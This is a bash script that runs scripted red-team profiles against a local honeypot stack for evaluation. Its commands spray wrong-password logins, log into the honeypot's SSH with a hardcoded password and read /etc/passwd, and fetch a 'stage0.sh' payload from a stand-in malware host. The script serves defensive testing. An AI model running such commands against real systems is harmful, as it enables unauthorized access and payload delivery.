#!/usr/bin/env bash
# Scripted red-team profiles for milestone 1 evaluation (all arms).
set -u

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
PROFILE="${1:-all}"
ARM="${2:-current}"

run_profile() {
  local name="$1"
  shift
  echo "== profile: $name =="
  "$@"
  sleep 1
}

echo "CyberSnare red-team profiles — arm: $ARM"
echo "Ensure stack is up. For Arm B: ./cs up-adaptive. For Arm C: ./cs up-p2"
echo

case "$PROFILE" in
  recon|all)
    run_profile recon-scan \
      curl -sk https://127.0.0.1:8443/ >/dev/null
    run_profile recon-scan \
      ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p 2222 probe@127.0.0.1 true 2>/dev/null || true
    ;;
esac

case "$PROFILE" in
  spray|all)
    for i in 1 2 3 4 5; do
      curl -sk -o /dev/null -w '' -X POST https://127.0.0.1:8443/login \
        -d "username=admin&password=wrong$i" 2>/dev/null || true
      ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p 2222 "user$i@127.0.0.1" true 2>/dev/null || true
    done
    echo "== profile: credential-spray done =="
    ;;
esac

case "$PROFILE" in
  engage|all)
    if [ -f "$ROOT/config/supervisor-approval.json" ]; then
      podman run --rm --network host docker.io/library/alpine:3.21 sh -c \
        "apk add -q openssh-client sshpass >/dev/null && sshpass -p 'nexus2024' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -p 2222 guest@127.0.0.1 'whoami; ls; cat /etc/passwd'" 2>/dev/null || true
    else
      echo "== profile: engage skipped (supervisor approval not on file — run gate first) =="
    fi
    ;;
esac

case "$PROFILE" in
  egress|all)
    podman exec cs-sandbox python -c "
import urllib.request
print(urllib.request.urlopen('http://malware.example/stage0.sh', timeout=3).read().decode())
" 2>/dev/null || echo "sandbox egress probe skipped"
    ;;
esac

echo
echo "Profiles complete. View: ./cs monitor  or  http://127.0.0.1:18090/"
